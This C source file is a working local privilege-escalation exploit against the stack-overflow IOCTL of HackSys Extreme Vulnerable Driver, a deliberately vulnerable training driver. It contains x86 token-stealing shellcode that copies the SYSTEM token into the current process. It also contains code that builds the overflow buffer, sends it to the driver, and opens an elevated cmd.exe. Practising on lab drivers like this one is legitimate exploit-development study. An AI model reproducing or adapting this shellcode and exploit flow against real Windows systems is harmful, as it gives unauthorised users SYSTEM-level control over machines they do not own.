#include <Windows.h>
#include <stdio.h>

#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)

int main(int argc, WCHAR* argv[])
{
	HANDLE hDevice;
	HANDLE hHeap;
	PUCHAR lpBuffer = NULL;
	LPVOID lpPayload;
	WCHAR filename[] = L"\\\\.\\HackSysExtremeVulnerableDriver";
	BOOL bDeviceControl;
	BOOL bFree;
	BOOL bNewProcess;
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;
	DWORD data = 0;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof si;
	ZeroMemory(&pi, sizeof(pi));

	CHAR shellcode[] = "\x60"		// pushad										; Save register state on the Stack
		"\x64\xA1\x24\x01\x00\x00"	// mov eax, fs:[KTHREAD_OFFSET]			; nt!_KPCR.PcrbData.CurrentThread
		"\x8B\x40\x50"			// mov eax, [eax + EPROCESS_OFFSET]		; nt!_KTHREAD.ApcState.Process
		"\x89\xC1"			// mov ecx, eax (Current _EPROCESS structure)	
		"\x8B\x98\xF8\x00\x00\x00"	// mov ebx, [eax + TOKEN_OFFSET]		; nt!_EPROCESS.Token
									//---[Copy System PID token]
		"\xBA\x04\x00\x00\x00"		// mov edx, 4 (SYSTEM PID)			; PID 4 -> System
		"\x8B\x80\xB8\x00\x00\x00"	// mov eax, [eax + FLINK_OFFSET] <-|		; nt!_EPROCESS.ActiveProcessLinks.Flink
		"\x2D\xB8\x00\x00\x00"		// sub eax, FLINK_OFFSET           |
		"\x39\x90\xB4\x00\x00\x00"	// cmp [eax + PID_OFFSET], edx     |		; nt!_EPROCESS.UniqueProcessId
		"\x75\xED"			// jnz				 ->|		; Loop !(PID=4)
		"\x8B\x90\xF8\x00\x00\x00"	// mov edx, [eax + TOKEN_OFFSET]		; System nt!_EPROCESS.Token
		"\x89\x91\xF8\x00\x00\x00"	// mov [ecx + TOKEN_OFFSET], edx		; Replace Current Process token
									//---[Recover]
		"\x61"				// popad										; Restore register state from the Stack
		"\x31\xC0"			// NTSTATUS -> STATUS_SUCCESS :p
		"\x5D"				// pop ebp
		"\xC2\x08\x00"			// ret 8
		;

	wprintf(L"[!] Exploit writed by : @l3x4overflow\r\n");
	wprintf(L"[!]WebSite: https://l3x4overflow.wordpress.com/ \r\n");

	wprintf(L"[*]Allocating virtual memory...\r\n");

	lpPayload = VirtualAlloc(
		NULL, 
		sizeof(shellcode), 
		MEM_COMMIT | MEM_RESERVE, 
		PAGE_EXECUTE_READWRITE
	);

	if (lpPayload == NULL) {
		wprintf(L"     [-]Error allocating virtual memory....\r\n");
	}

	else {
		wprintf(L"     [+]Virtual memory successfull allocated...\r\n");
	}

	wprintf(L"[*]Copying shellcode in virtual memory...\r\n");

	RtlCopyMemory(lpPayload, shellcode, sizeof(shellcode));

	wprintf(L"[*]Creating heap...\r\n");

	hHeap = GetProcessHeap();

	if (hHeap == INVALID_HANDLE_VALUE) {
		wprintf(L"     [-]Error getting heap process...\r\n");
	}

	else {
		wprintf(L"     [+]Heap process created successfully...\r\n");
	}

	lpBuffer = (PUCHAR)HeapAlloc(
		hHeap, 
		HEAP_ZERO_MEMORY, 
		2084
	);

	if (lpBuffer == NULL) {
		wprintf(L"     [-]Failed allocating heap...\r\n");
	}

	else {
		wprintf(L"     [+]Heap allocated successfully...\r\n");
	}

	wprintf(L"[*]Creating exploit buffer...\r\n");
	
	RtlFillMemory(lpBuffer, 2084, 0x41);
	RtlFillMemory(lpBuffer + 2076, 4, 'B');
	memcpy(lpBuffer + 2080, &lpPayload, 4);

	wprintf(L"     [+]Buffer created successfully...\r\n");

	wprintf(L"[*]Creating device handler...\r\n");

	hDevice = CreateFile(
		filename,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (hDevice == INVALID_HANDLE_VALUE) {
		wprintf(L"     [-]Error creating file handler...\r\n");
	}

	else {
		wprintf(L"     [+]File handler created successfully...\r\n");
	}

	wprintf(L"[*]Sending buffer to IOCTL...\r\n");

	bDeviceControl = DeviceIoControl(
		hDevice,
		HACKSYS_EVD_IOCTL_STACK_OVERFLOW,
		lpBuffer, 
		2084,
		NULL,
		0,
		&data,
		NULL
	);

	if (bDeviceControl == FALSE) {
		wprintf(L"     [-]Error connecting with IOCTL...\r\n");
	}

	else {
		wprintf(L"     [+]Buffer sended succesfully...\r\n");
	}

	wprintf(L"[*]Stolen Token successfully...\r\n");

	wprintf(L"[*]Creating cmd.exe process with admin privileges...\r\n");

	bNewProcess = CreateProcess(
		L"C:\\Windows\\System32\\cmd.exe", 
		NULL, 
		NULL, 
		NULL, 
		0, 
		CREATE_NEW_CONSOLE, 
		NULL, 
		NULL, 
		&si, 
		&pi
	);

	if (bNewProcess == FALSE) {
		wprintf(L"     [-]Failed creating process...\r\n");
	}

	else {
		wprintf(L"     [+]Process created succesfully...\r\n");
	}

	bFree = HeapFree(
		hHeap, 
		0, 
		lpBuffer
	);

	if (bFree == FALSE) {
		wprintf(L"     [-]Failed freezing heap...\r\n");
	}

	else {
		wprintf(L"     [+]Heap freezed successfully...\r\n");
	}

	CloseHandle(hDevice);

	system("PAUSE");
	return 0;
}
